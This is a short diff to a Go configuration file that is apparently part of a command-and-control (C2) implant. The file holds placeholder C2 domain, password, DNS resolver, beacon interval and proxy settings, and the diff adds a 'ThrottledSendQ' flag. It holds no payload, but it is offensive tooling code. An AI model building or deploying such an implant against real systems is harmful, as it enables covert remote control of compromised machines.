@@ -3,13 +3,14 @@ package config
 // config.go is modified by c2 before compilation
 
 type Config struct {
-	C2Domain     string
-	C2Password   string
-	Resolver     string
-	C2Interval   int
-	ProxyEnabled bool
-	ProxyUrl     string
-	ProxyKey     string
+	C2Domain        string
+	C2Password      string
+	Resolver        string
+	C2Interval      int
+    ThrottledSendQ  bool
+	ProxyEnabled    bool
+	ProxyUrl        string
+	ProxyKey        string
 }
 
 func (c *Config) Init() {
@@ -17,6 +18,7 @@ func (c *Config) Init() {
 	c.C2Password = "[C2_PASSWORD]"
 	c.Resolver = "[RESOLVER]"
 	c.C2Interval = 5000
+	c.ThrottledSendQ = false
 	c.ProxyEnabled = false
 	c.ProxyUrl = "[PROXY_URL]"
 	c.ProxyKey = "[PROXY_KEY]"
